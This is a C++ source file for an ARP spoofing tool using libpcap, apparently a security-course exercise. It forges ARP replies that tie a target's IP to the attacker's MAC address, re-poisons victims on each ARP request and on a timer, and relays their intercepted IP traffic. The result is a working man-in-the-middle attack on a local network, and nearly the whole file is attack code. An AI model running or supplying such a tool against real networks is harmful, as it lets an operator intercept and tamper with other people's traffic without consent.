#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "EthArpPacket.h"
#include "EthTcpPacket.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <string>
#include <vector>
#include <iostream>
#include<time.h>
#define RELAY 1
#define INFECT 2
using namespace std;
#pragma pack(push, 1)
struct Spoof final{
    Spoof(){}
    Spoof(Ip sip, Ip tip,Mac smac, Mac tmac,EthArpPacket pckt){
		sip_=sip; tip_=tip; tmac_=tmac; smac_=smac; infctpckt=pckt; 
	}
public:
	Ip sip_;
    Ip tip_;
	Mac tmac_;
	Mac smac_;
    EthArpPacket infctpckt;
};
#pragma pack(pop)
Spoof spoofarr[40];
int idx=0;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}
Mac getmymac(struct ifreq ifr){
	Mac mymac=Mac(ifr.ifr_hwaddr); //using overloaded constructor
	return mymac;
}
Ip getmyip(struct ifreq ifr){
	Ip myip=Ip(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr); //using overloaded constructor
	return myip;
}
Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
	EthArpPacket packet;
	const u_char* rawpacket;
	//constructing arp request packet: 'who is sip??'
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//broadcast
	packet.eth_.smac_ = mmac;//mac of mine
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = mmac;//mac of mine
	packet.arp_.sip_ = htonl(mip);//ip of mine
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //not defined
	packet.arp_.tip_ = htonl(sip);//ip of sender : target
	//send arp request
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); 
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	while(1){
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &rawpacket);
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		memcpy(&packet,rawpacket,sizeof(EthArpPacket)); //recive pckt pointer 
		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){//if received packet is Arpreply and ip check
			Mac resultmac=packet.arp_.smac_;
			return resultmac;
		}
		else
			continue;
    }
}
void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
	int flag=0;
	EthHdr* ethinfo=(EthHdr*)packet;
	IpHdr* ipinfo=(IpHdr*)(packet+ETHHDRSIZE);
	int size=len;
	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
	memcpy(relaypacket, packet, sizeof(char)*size);
	EthHdr* ethhdr=(EthHdr*)relaypacket;
	IpHdr* iphdr=(IpHdr*)(relaypacket+ETHHDRSIZE);
	for(int i=0; i<idx; i++){///searching for matched ip
		if(spoofarr[i].smac_==ethhdr->smac_){
			flag=1;
			ethhdr->smac_=mmac;
			ethhdr->dmac_=spoofarr[i].tmac_;
			break;
		}
	}
	if(flag==1){//if matched
		EthTcpPacket* tcp=(EthTcpPacket*)relaypacket;
		int res = pcap_sendpacket(handle, relaypacket, size);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n",res, pcap_geterr(handle));
			res = pcap_sendpacket(handle, relaypacket+1514, size-1514); //if error, send again
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s Again\n",res, pcap_geterr(handle));
			}
		}
	}
	free(relaypacket);	
}
//send infect pacet to all pairs
void SendInfectFlood(pcap_t* handle){
	for(int i=0; i<idx; i++){
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
	}
}
//send arp reply to targetd pair
void SendInfect(pcap_t* handle, Ip sip){
	for(int i=0; i<idx; i++){
		if((uint32_t)spoofarr[i].sip_==ntohl(sip)){
			printf("send arp\n");
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			return;
		}
	}
}
//parsing and return type of packet
int parsing(const u_char* packet, Ip mip){
	EthHdr* ethhdr=(EthHdr*)packet;
	if(ntohs(ethhdr->type_)==EthHdr::Arp){
		ArpHdr* arphdr=(ArpHdr*)(packet+ETHHDRSIZE);
		if(ntohs(arphdr->op_)==ArpHdr::Request)
			return INFECT;
	}
	else if(ntohs(ethhdr->type_)==EthHdr::Ip4 || ntohs(ethhdr->type_)==EthHdr::Ip6 ){
		IpHdr* iphdr=(IpHdr*)(packet+ETHHDRSIZE);
		Ip dip=ntohl(iphdr->ip_dst);
		if(dip==mip)// own to me
			return -1;
		for(int i=0; i<idx; i++){
			if(ethhdr->smac_==spoofarr[i].smac_)
				return RELAY;
		}
	}
	return -1;
}
//initialize spoofing pair array
void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
	EthArpPacket packet;
	Mac smac=getmac(handle,myip,senderip,mmac);
	Mac tmac=getmac(handle,myip,targetip,mmac);
	packet.eth_.dmac_ = smac;//mac of sender
	packet.eth_.smac_ = mmac;//mac of mine(attacker)
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = mmac;//mac of mine(attacker)
	packet.arp_.sip_ = htonl(targetip);//ip of target
	packet.arp_.tmac_ = smac;//mac of sender
	packet.arp_.tip_ = htonl(senderip);//ip of sender
	Spoof result=Spoof(senderip, targetip, smac, tmac, packet);
	memcpy(&spoofarr[idx++],&result,sizeof(Spoof));
}
int main(int argc, char* argv[]) {
	if (argc %2==1) {
		usage();
		return -1;
	}
	int len=(argc-2)/2;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 1514, 1, 1, errbuf); //read_timeout 10
	pcap_set_immediate_mode(handle,3);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	const u_char* rawpacket;
	EthArpPacket packet;
	EthTcpPacket* tcppacket;
	EthArpPacket* arppacket;
	///using ioctl & ifreq to get device information
	int sock;
	struct ifreq ifr;
	struct ifreq ifr_ip;
	memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
	memset(&ifr_ip, 0x00, sizeof(ifr));
    strcpy(ifr_ip.ifr_name, dev);
 	ifr_ip.ifr_addr.sa_family = AF_INET;

    int fd=socket(AF_INET, SOCK_DGRAM, 0);
    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
        perror("socket ");
    }
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl mac");
        exit(1);
    }
	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
        perror("ioctl ip");
        exit(1);
    }
	close(sock);
	///
	Ip myip=getmyip(ifr_ip);
	Mac mmac=getmymac(ifr);
	printf("[info] collect my ip mac completed\n");
	for(int i=0; i<len; i++){
		printf("[info] init\n");
		init(handle, Ip(argv[2+i*2]),Ip(argv[3+i*2]),myip, mmac);
	}
	for(int i=0; i<idx; i++){
		printf("sending arp!!...\n");
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}
	int res;
	clock_t start=clock();
	while(1){
		clock_t end=clock();
		if((end - start)>20000){
			printf("flooding...\n");
			SendInfectFlood(handle);
			start=end;
		}
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &rawpacket);
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		res=parsing(rawpacket, myip);
		switch (res)
		{
		case INFECT:
			arppacket=(EthArpPacket*)rawpacket;
			SendInfect(handle, arppacket->arp_.sip_);
			break;
		case RELAY:
			Relay(handle, rawpacket,mmac,header->len);
		default:
			break;
		}
    }
	pcap_close(handle);
}
